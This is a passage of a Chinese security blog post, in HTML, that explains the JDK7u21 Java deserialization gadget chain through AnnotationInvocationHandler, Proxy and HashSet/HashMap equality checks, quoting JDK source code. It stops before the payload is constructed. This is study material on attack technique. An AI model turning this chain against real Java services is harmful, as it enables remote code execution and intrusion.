

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Decemberus">
  <meta name="keywords" content="">
  
    <meta name="description" content="原生JDK7u21参考P神的讲解进行了一定的注释与修改 核心原理相信学习了CommonsCollections的这些利用链后，大家心里对反序列化有自己的认识。如果问，什么是某条反序列化利用链的核心点，有的同学可能会说是readObject或TemplatesImpl。不过我的理解是，核心在于触发“动态方法执行”的地方，而不是TemplatesImpl或某个类的readObject方法。 一个例子">
<meta property="og:type" content="article">
<meta property="og:title" content="7U21与8U20">
<meta property="og:url" content="https://decemberus.com/2023/03/12/%E5%8E%9F%E7%94%9FJDK7u21%E4%B8%8E8u20/index.html">
<meta property="og:site_name" content="欢迎回来">
<meta property="og:description" content="原生JDK7u21参考P神的讲解进行了一定的注释与修改 核心原理相信学习了CommonsCollections的这些利用链后，大家心里对反序列化有自己的认识。如果问，什么是某条反序列化利用链的核心点，有的同学可能会说是readObject或TemplatesImpl。不过我的理解是，核心在于触发“动态方法执行”的地方，而不是TemplatesImpl或某个类的readObject方法。 一个例子">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410212825179.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410215242230.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410225833994.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230223224253392.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414183955883.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414221257829.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230223230550344.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093749138.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093914002.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414093847402.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414101213128.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414230044740.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415153240075.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415192151850.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415192533851.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415223523459.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414222627594.png">
<meta property="og:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414222652854.png">
<meta property="article:published_time" content="2023-03-12T11:19:27.000Z">
<meta property="article:modified_time" content="2024-03-02T06:05:04.356Z">
<meta property="article:author" content="Decemberus">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410212825179.png">
  
  
  <title>7U21与8U20 - 欢迎回来</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"decemberus.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>

  
<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>enjoy的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="7U21与8U20"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-03-12 19:19" pubdate>
          2023年3月12日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          46k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          387 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">7U21与8U20</h1>
            
            <div class="markdown-body">
              
              <h1 id="原生JDK7u21"><a href="#原生JDK7u21" class="headerlink" title="原生JDK7u21"></a>原生JDK7u21</h1><p>参考P神的讲解进行了一定的注释与修改</p>
<h2 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h2><p>相信学习了CommonsCollections的这些利用链后，大家心里对反序列化有自己的认识。如果问，什么是某条反序列化利用链的核心点，有的同学可能会说是readObject或TemplatesImpl。不过我的理解是，核心在于触发“动态方法执行”的地方，而不是TemplatesImpl或某个类的readObject方法。</p>
<p>一个例子</p>
<ul>
<li>CC系列利用链核心是那一堆Transformer，特别是其中的<code>InvokerTransformer</code>，<code>InstantiateTransformer</code></li>
<li>CB反序列化的核心是<code>PropertyUtils#getProperty</code>，因为他会触发任意对象的getter</li>
</ul>
<p>JDK7u21的核心是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p>
<p>看这个类中的<code>equalsImpl</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Boolean <span class="hljs-title function_">equalsImpl</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!type.isInstance(o))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> memberMethod.getName();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">ourValue</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">hisValue</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">AnnotationInvocationHandler</span> <span class="hljs-variable">hisHandler</span> <span class="hljs-operator">=</span> asOneOfUs(o);<br>        <span class="hljs-keyword">if</span> (hisHandler != <span class="hljs-literal">null</span>) &#123;<br>            hisValue = hisHandler.memberValues.get(member);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                hisValue = memberMethod.invoke(o);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(e);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!memberValueEquals(ourValue, hisValue))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Method[] memberMethods = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> Method[] getMemberMethods() &#123;<br>    <span class="hljs-keyword">if</span> (memberMethods == <span class="hljs-literal">null</span>) &#123;<br>        memberMethods = AccessController.doPrivileged(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;<br>                <span class="hljs-keyword">public</span> Method[] run() &#123;<br>                    <span class="hljs-keyword">final</span> Method[] mm = type.getDeclaredMethods();<br>                    AccessibleObject.setAccessible(mm, <span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">return</span> mm;<br>                &#125;<br>            &#125;);<br>    &#125;<br>    <span class="hljs-keyword">return</span> memberMethods;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个方法中有个很明显的反射调用 <code>memberMethod.invoke(o)</code> ，而 memberMethod 来自于<code>this.type.getDeclaredMethods()</code> 。</p>
<p>也就是说，equalsImpl 这个方法是将 this.type 类中的所有方法遍历并执行了。那么，假设this.type 是Templates类，则势必会调用到其中的 <code>newTransformer()</code> 或 <code>getOutputProperties()</code>方法，进而触发任意代码执行。</p>
<p>这就是JDK7u21的核心原理。</p>
<h2 id="如何调用equalsImpl"><a href="#如何调用equalsImpl" class="headerlink" title="如何调用equalsImpl"></a>如何调用equalsImpl</h2><p>那么，现在的任务就是通过反序列化调用 equalsImpl ， equalsImpl 是一个私有方法，在<code>AnnotationInvocationHandler#invoke</code> 中被调用。</p>
<p>调用私有方法可以使用Java代理</p>
<p>InvocationHandler只有一个接口，方法是invoke</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span><br><span class="hljs-keyword">throws</span> Throwable;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在使用 <code>java.reflect.Proxy</code> 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到<code>InvocationHandler#invoke</code> 。执行invoke时，被传入的第一个参数是这个proxy对象，第二个参数是被执行的方法名，第三个参数是执行时的参数列表。</p>
<p>而 <code>AnnotationInvocationHandler</code> 就是一个 <code>InvocationHandler</code> 接口的实现，我们看看它的<code>invoke</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><span class="hljs-comment">// Handle Object and Annotation methods</span><br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>paramTypes[<span class="hljs-number">0</span>] == Object.class)<br><span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">assert</span> paramTypes.length == <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;toString&quot;</span>))<br><span class="hljs-keyword">return</span> toStringImpl();<br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;hashCode&quot;</span>))<br><span class="hljs-keyword">return</span> hashCodeImpl();<br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;annotationType&quot;</span>))<br><span class="hljs-keyword">return</span> type;<br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure>

<p>可见，当方法名等于“equals”，且仅有一个Object类型参数时，会调用到 equalImpl 方法。</p>
<p>所以，现在的问题变成，我们需要找到一个方法，在反序列化时对proxy调用equals方法</p>
<h2 id="找到equals方法调用链"><a href="#找到equals方法调用链" class="headerlink" title="找到equals方法调用链"></a>找到equals方法调用链</h2><p>比较Java对象时，我们常用到两个方法：</p>
<ul>
<li>equals</li>
<li>compareTo</li>
</ul>
<p>任意Java对象都拥有 equals 方法，它通常用于比较两个对象是否是同一个引用；而compareTo实际上是 java.lang.Comparable 接口的方法，我在前一篇介绍 java.util.PriorityQueue 时也介绍过，通常被实现用于比较两个对象的值是否相等。</p>
<p>所以，我第一时间想到使用 java.util.PriorityQueue ，但实际上其中用的是compareTo，而非equals。</p>
<p>另一个常见的会调用equals的场景就是集合set。set中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作。</p>
<p>我们查看HashSet的readObject方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in any hidden serialization magic</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read capacity and verify non-negative.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">capacity</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-keyword">if</span> (capacity &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal capacity: &quot;</span> +<br>                                         capacity);<br>    &#125;<br><br>    <span class="hljs-comment">// Read load factor and verify positive and non NaN.</span><br>    <span class="hljs-type">float</span> <span class="hljs-variable">loadFactor</span> <span class="hljs-operator">=</span> s.readFloat();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    &#125;<br><br>    <span class="hljs-comment">// Read size and verify non-negative.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-keyword">if</span> (size &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal size: &quot;</span> +<br>                                         size);<br>    &#125;<br><br>    <span class="hljs-comment">// Set the capacity according to the size and load factor ensuring that</span><br>    <span class="hljs-comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span><br>    capacity = (<span class="hljs-type">int</span>) Math.min(size * Math.min(<span class="hljs-number">1</span> / loadFactor, <span class="hljs-number">4.0f</span>),<br>            HashMap.MAXIMUM_CAPACITY);<br><br>    <span class="hljs-comment">// Create backing HashMap</span><br>    map = (((HashSet&lt;?&gt;)<span class="hljs-built_in">this</span>) <span class="hljs-keyword">instanceof</span> LinkedHashSet ?<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));<br><br>    <span class="hljs-comment">// Read in all elements in the proper order.</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (E) s.readObject();<br>        map.put(e, PRESENT);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>可见，这里使用了一个HashMap，将对象保存在HashMap的key处来做去重。</p>
<p>HashMap，就是数据结构里的哈希表，相信上过数据结构课程的同学应该还记得，哈希表是由数组+链表实现的——哈希表底层保存在一个数组中，数组的索引由哈希表的 key.hashCode() 经过计算得到，数组的值是一个链表，所有哈希碰撞到相同索引的key-value，都会被链接到这个链表后面。</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410212825179.png" srcset="/img/loading.gif" lazyload alt="image-20230410212825179"> </p>
<p>所以，为了触发比较操作，我们需要让比较与被比较的两个对象的哈希相同，这样才能被连接到同一条链表上，才会进行比较。</p>
<p>跟进HashMap的put方法（很奇怪，这里我找到的get方法是这样的）</p>
<blockquote>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">public V <span class="hljs-built_in">put</span>(K <span class="hljs-built_in">key</span>, V value) &#123;<br>    <span class="hljs-built_in">return</span> putVal(hash(<span class="hljs-built_in">key</span>), <span class="hljs-built_in">key</span>, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解决办法如下</p>
<p>我们可以看到，虽然在项目结构中是java1.7</p>
<p>但是在外部库中确实java8u65</p>
<p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410215242230.png" srcset="/img/loading.gif" lazyload alt="image-20230410215242230"> </p>
<ol>
<li>运行 <code>mvn dependency:purge-local-repository</code> 命令。这将清除本地仓库中的所有依赖项。</li>
<li>运行 <code>mvn clean install</code> 命令。这将重新构建你的项目并下载所有必要的依赖项。</li>
<li>然后在项目结构中改为jdk1.7</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> putForNullKey(value);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(key);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> indexFor(hash, table.length);<br>    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-literal">null</span>; e = e.next) &#123;<br>        Object k;<br>        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<br>            <span class="hljs-type">V</span> <span class="hljs-variable">oldValue</span> <span class="hljs-operator">=</span> e.value;<br>            e.value = value;<br>            e.recordAccess(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br>    modCount++;<br>    addEntry(hash, key, value, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>变量 i 就是这个所谓的“哈希”。两个不同的对象的 i 相等时，才会执行到 <code>key.equals(k)</code>，触发前面说过的代码执行。</p>
<p>所以，我们接下来的目的就是为了让<code>proxy</code>对象的“哈希”，等于<code>TemplateImpl</code>对象的“哈希”。</p>
<h2 id="构造Magic-Number"><a href="#构造Magic-Number" class="headerlink" title="构造Magic Number"></a>构造Magic Number</h2><p>计算哈希值是通过下面这两种代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(key);<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> indexFor(hash, table.length);<br><span class="hljs-comment">//indexFor根据给定的哈希值和表的长度来计算键值对在表中的索引位置。这个方法通常用于哈希表数据结构中</span><br></code></pre></td></tr></table></figure>

<p>提炼其中关键逻辑</p>
<p>hash的方法是这样的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object k)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (useAltHashing) &#123;<br>        <span class="hljs-keyword">if</span> (k <span class="hljs-keyword">instanceof</span> String) &#123;<br>            <span class="hljs-keyword">return</span> sun.misc.Hashing.stringHash32((String) k);<br>        &#125;<br>        h = hashSeed;<br>    &#125;<br><br>    h ^= k.hashCode();<br><br>    <span class="hljs-comment">// This function ensures that hashCodes that differ only by</span><br>    <span class="hljs-comment">// constant multiples at each bit position have a bounded</span><br>    <span class="hljs-comment">// number of collisions (approximately 8 at default load factor).</span><br>    h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);<br>    <span class="hljs-keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>而indexFor则是这样的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">indexFor</span><span class="hljs-params">(<span class="hljs-type">int</span> h, <span class="hljs-type">int</span> length)</span> &#123;<br>    <span class="hljs-keyword">return</span> h &amp; (length-<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以我们可以自己提炼出这么一个函数</p>
